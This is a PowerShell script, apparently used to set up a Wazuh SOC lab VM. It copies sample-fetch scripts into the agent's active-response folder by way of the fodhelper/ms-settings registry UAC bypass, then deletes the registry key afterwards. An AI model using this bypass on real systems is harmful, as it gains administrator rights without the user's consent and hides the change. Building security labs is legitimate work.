# One-shot elevated installer for SOC-Victim (lab VM, own device).
# Uses the ms-settings/fodhelper auto-elevate path to copy the fetch scripts
# into the Wazuh agent's active-response bin, then cleans up after itself.
$src = 'C:\Users\victim\soc-ar'
$dst = 'C:\Program Files (x86)\ossec-agent\active-response\bin'

$inner = '/c copy /y "' + $src + '\soc-fetch-sample.cmd" "' + $dst + '" && copy /y "' + $src + '\soc-fetch-sample.ps1" "' + $dst + '" && echo done > "' + $src + '\elev_done.txt"'

$cmdKey = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item -Path $cmdKey -Force | Out-Null
Set-ItemProperty -Path $cmdKey -Name '(default)' -Value ("cmd.exe " + $inner)
New-Item -Path ($cmdKey + '\DelegateExecute') -Force | Out-Null

Start-Process 'C:\Windows\System32\fodhelper.exe'
Start-Sleep -Seconds 6

Remove-Item -Path ($cmdKey + '\DelegateExecute') -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $cmdKey -Recurse -Force -ErrorAction SilentlyContinue

if (Test-Path "$dst\soc-fetch-sample.cmd") { 'INSTALL-OK' } else { 'INSTALL-FAILED' }
